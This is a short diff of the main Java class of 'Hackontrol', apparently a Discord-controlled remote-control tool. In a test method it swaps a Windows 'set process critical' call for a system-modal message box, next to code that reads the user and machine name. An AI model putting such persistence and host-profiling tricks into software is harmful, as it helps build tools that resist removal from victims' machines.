@@ -9,7 +9,7 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.nativelibrary.Information;
-import com.khopan.hackontrol.nativelibrary.Kernel;
+import com.khopan.hackontrol.nativelibrary.User;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
@@ -17,6 +17,7 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.hackontrol.win32.WinUser;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -260,7 +261,8 @@ public class Hackontrol {
 		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\libnative32.dll");
 		System.out.println("Username: " + Information.getUserName());
 		System.out.println("Machine name: " + Information.getMachineName());
-		Kernel.setProcessCritical(false);
+		int response = User.showMessageBox("Motor", "Hello, world!", WinUser.MB_OKCANCEL | WinUser.MB_ICONINFORMATION | WinUser.MB_DEFBUTTON1 | WinUser.MB_SYSTEMMODAL);
+		System.out.println(response);
 	}
 
 	public static Hackontrol getInstance() {
